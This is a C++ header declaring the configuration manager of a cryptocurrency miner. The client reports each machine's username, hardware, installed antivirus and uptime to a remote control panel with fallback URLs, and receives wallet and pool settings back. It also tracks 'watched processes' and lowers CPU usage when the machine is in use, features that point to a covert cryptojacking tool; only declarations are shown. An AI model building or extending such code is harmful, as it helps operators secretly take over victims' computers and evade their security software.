#pragma once

#include <string>
#include <vector>
#include <unordered_map>
#include "json.hpp"

using json = nlohmann::json;

struct MinerConfig {
    std::string mining_url;
    std::string wallet;
    std::string password;
    std::string worker;
    std::string algo;
    double non_idle_usage = 50.0;
    double idle_usage     = 100.0;
    int wait_time_idle    = 3;
    int use_ssl           = 0;   // 0 = no SSL, 1 = SSL/TLS
    int enabled           = 1;   // 0 = disabled, 1 = enabled
    int fan_speed         = 0;   // GPU fan speed % (0 = auto, 1-100 = manual)
};

class ConfigManager {
public:
    ConfigManager() = default;
    
    // Submit miner info to panel and get config back (single URL)
    bool FetchConfigFromPanel(const std::wstring& panelUrl, 
                             const std::string& pcUsername,
                             const std::string& deviceHash,
                             const std::string& cpuName,
                             const std::string& gpuName,
                             const std::string& antivirusName,
                             const std::string& clientVersion,
                             double cpuHashrate = 0.0,
                             double gpuHashrate = 0.0,
                             int deviceUptimeMin = 0);
    
    // Submit miner info with fallback URLs
    bool FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                          const std::string& pcUsername,
                                          const std::string& deviceHash,
                                          const std::string& cpuName,
                                          const std::string& gpuName,
                                          const std::string& antivirusName,
                                          const std::string& clientVersion,
                                          double cpuHashrate = 0.0,
                                          double gpuHashrate = 0.0,
                                          int deviceUptimeMin = 0);
    
    // Fetch config directly via GET request with fallback URLs
    bool FetchConfigFromUrlWithFallback(const std::string& configUrls);
    
    // Load embedded config (fallback when no remote config available)
    bool LoadEmbeddedConfig();
    
    // Get configuration
    const MinerConfig& GetCPUConfig() const { return cpuConfig; }
    const MinerConfig& GetGPUConfig() const { return gpuConfig; }
    const std::vector<std::string>& GetWatchedProcesses() const { return watchedProcesses; }

    // Per-algorithm donation targets (keyed by algo name).
    const std::unordered_map<std::string, MinerConfig>& GetDonateConfigs() const { return donateConfigs; }
    bool GetDonateConfig(const std::string& algo, MinerConfig& out) const;

    // Returns true if the last successful config fetch came from the panel (not embedded fallback)
    bool IsLastFetchFromPanel() const { return m_lastFetchFromPanel; }
    
    // Build command line arguments from config
    std::string BuildCommandLineArgs(const MinerConfig& config, bool isIdle = false);
    
private:
    MinerConfig cpuConfig;
    MinerConfig gpuConfig;
    std::vector<std::string> watchedProcesses;
    std::unordered_map<std::string, MinerConfig> donateConfigs;
    bool m_lastFetchFromPanel = false;
    
    void ParseConfigFromJson(const json& jsonResponse);
    bool FetchConfigFromUrlDirect(const std::wstring& configUrl);
};
